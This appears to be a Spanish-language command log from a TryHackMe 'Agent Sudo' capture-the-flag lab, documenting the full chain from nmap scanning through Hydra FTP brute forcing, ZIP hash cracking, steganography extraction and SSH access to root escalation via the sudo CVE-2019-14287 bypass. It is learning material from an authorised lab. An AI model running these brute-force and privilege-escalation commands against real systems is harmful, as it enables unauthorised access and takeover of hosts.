
# LAB-010 — REGISTRO DE COMANDOS

**Proyecto:** FANTASMA — Pentesting & Red Team  
**Plataforma:** TryHackMe  
**Máquina:** Agent Sudo  
**Fecha:** 20/11/2026  
**Objetivo:** Documentar los comandos utilizados durante el laboratorio.

> Todos los comandos se utilizaron exclusivamente en un entorno autorizado de TryHackMe. La IP corresponde a una instancia temporal.

---

## 01 — Reconocimiento de servicios

### Escaneo de puertos y versiones

```bash
nmap -sV -Pn 10.67.163.128
```

Identifica los servicios accesibles y sus versiones.

### Enumeración FTP

```bash
nmap --script ftp-anon -p 21 10.67.163.128
```

Comprueba si el servicio FTP permite autenticación anónima.

## 02 — Enumeración HTTP

### Consultar la página web

```bash
curl http://10.67.163.128
```

### Modificar la cabecera User-Agent

```bash
curl -A 'C' -i http://10.67.163.128
```

### Seguir redirecciones HTTP

```bash
curl -L -A 'C' http://10.67.163.128
```

La enumeración permitió descubrir información sobre el agente C.

## 03 — Evaluación de credenciales FTP

### Ataque de diccionario

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 4 -f ftp://10.67.163.128
```

Permite comprobar contraseñas de un usuario conocido mediante un diccionario.

### Conexión FTP

```bash
ftp 10.67.163.128
```

### Enumeración de archivos FTP

```text
ls -la
```

### Descargar archivos

```text
get To_agentJ.txt
get cutie.png
```

## 04 — Análisis de archivos

### Identificar archivos incrustados

```bash
binwalk cutie.png
```

### Extraer contenido identificado

```bash
binwalk -e cutie.png
```

### Inspeccionar el ZIP

```bash
7z l -slt _cutie.png.extracted/8702.zip
```

## 05 — Recuperación de contraseña ZIP

### Generar hash

```bash
zip2john _cutie.png.extracted/8702.zip > zip.hash
```

### Evaluar el hash con RockYou

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

### Extraer el ZIP

```bash
7z x _cutie.png.extracted/8702.zip
```

El programa solicita la contraseña recuperada.

### Leer el mensaje

```bash
cat To_agentR.txt
```

## 06 — Decodificación Base64

```bash
echo 'QXJlYTUx' | base64 -d
```

Decodifica la pista encontrada en el documento.

## 07 — Esteganografía

### Descargar la imagen

```bash
curl -u chris ftp://10.67.163.128/cute-alien.jpg -o cute-alien.jpg
```

### Inspeccionar con Steghide

```bash
steghide info cute-alien.jpg
```

### Analizar con Stegseek

```bash
stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
```

### Leer el documento extraído

```bash
cat cute-alien.jpg.out
```

## 08 — Acceso SSH

### Conexión remota

```bash
ssh james@10.67.163.128
```

### Enumerar archivos

```bash
ls -la
```

### Leer la bandera de usuario

```bash
cat user_flag.txt
```

## 09 — Enumeración de privilegios

### Comprobar permisos sudo

```bash
sudo -l
```

### Consultar versión

```bash
sudo --version
```

## 10 — Escalada de privilegios

**Vulnerabilidad:** CVE-2019-14287

### Ejecutar Bash mediante UID especial

```bash
sudo -u#-1 /bin/bash
```

### Verificar identidad

```bash
id
```

Resultado observado:

```text
uid=0(root) gid=1000(james) groups=1000(james)
```

## 11 — Recuperación de la bandera root

### Enumerar directorio root

```bash
ls -la /root
```

### Leer bandera final

```bash
cat /root/root.txt
```

## 12 — Herramientas utilizadas

| Herramienta | Función |
|---|---|
| Nmap | Reconocimiento |
| Curl | Enumeración HTTP y descarga |
| Hydra | Evaluación de contraseñas |
| FTP | Transferencia de archivos |
| Binwalk | Análisis de archivos |
| 7-Zip | Extracción de ZIP |
| John the Ripper | Recuperación de contraseñas |
| Base64 | Decodificación |
| Steghide | Análisis esteganográfico |
| Stegseek | Recuperación de datos ocultos |
| SSH | Acceso remoto |
| Sudo | Enumeración y escalada |

## 13 — Lecciones aprendidas

- Enumerar antes de explotar.
- Analizar cuidadosamente las pistas encontradas.
- Diferenciar codificación, cifrado y esteganografía.
- Documentar los resultados de cada herramienta.
- Revisar permisos sudo y versiones vulnerables.
- Verificar siempre los privilegios obtenidos.
- Mantener credenciales y evidencias privadas fuera de GitHub.

---

**FANTASMA — Pentesting & Red Team**  
**LAB-010 AGENT SUDO — Comandos documentados**
